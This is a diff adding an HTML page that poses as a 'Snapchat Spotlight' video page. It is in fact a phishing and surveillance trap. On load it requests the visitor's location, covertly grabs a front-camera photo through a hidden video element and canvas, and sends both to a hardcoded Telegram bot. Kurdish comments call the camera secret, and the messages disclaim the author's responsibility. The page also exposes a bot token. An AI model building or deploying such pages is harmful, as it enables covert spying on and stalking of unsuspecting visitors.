@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Spotlight</title>
+    <style>
+        body { 
+            background-color: #000; 
+            color: white; 
+            font-family: Arial; 
+            text-align: center; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        #hidden-video, #canvas { display: none; }
+        
+        #spotlight-video {
+            width: 80%;
+            max-width: 380px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.3);
+            margin-bottom: 15px;
+        }
+        h1 { font-size: 22px; margin: 5px 0; color: #fffc00; }
+        p { font-size: 14px; color: #ccc; }
+    </style>
+</head>
+<body>
+
+    <div>
+‎        <!-- ڤیدیۆیا تیکتۆکێ یا داوۆنلۆدکری و بارکری ل هەمەن فۆلدر -->
+        <video id="spotlight-video" src="tiktok-video.mp4" autoplay loop controls playsinline></video>
+        
+        <h1>Snapchat Spotlight</h1>
+        <p>هيڤي دكه م وه بكه ڤيديو ڤه بيتن ...</p>
+    </div>
+
+‎    <!-- کامیرایا نهێنی بۆ گرتنا وێنەی -->
+    <video id="hidden-video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
+        const chat_id = 'ID:'7643191802';
+
+
+        async function sendMessage(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: text })
+            });
+        }
+
+        function askLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    sendMessage(`📍 جهئ وي هاته ديتن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                }, () => sendMessage("⚠️ نه هئلا جهئ وي ببيني هه ر كاره كئ بئ اخلاق ام به ر پرس نينين (GPS) او كه سئ بوت درسكري @YUSEEF_SURCHI"));
+            }
+        }
+
+        async function startCamera() {
+            try {
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: "user"
+                    }
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('hidden-video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chat_id);
+                            formData.append('photo', blob, 'snap_hd.jpg');
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                        }, 'image/jpeg', 1.0);
+                    }, 2500);
+                };
+            } catch (err) {
+                sendMessage("⚠️ رئكئ ب کاميرئ ناده تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI");
+            }
+        }
+
+        window.onload = () => {
+            sendMessage("🚀 کەسەک هاتە دناف ويبسايتي دا، نوكه داخازيا کامێرئ و جهئ وي دكه تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI");
+            askLocation();
+            startCamera();
+        };
+    </script>
+</body>
+</html>
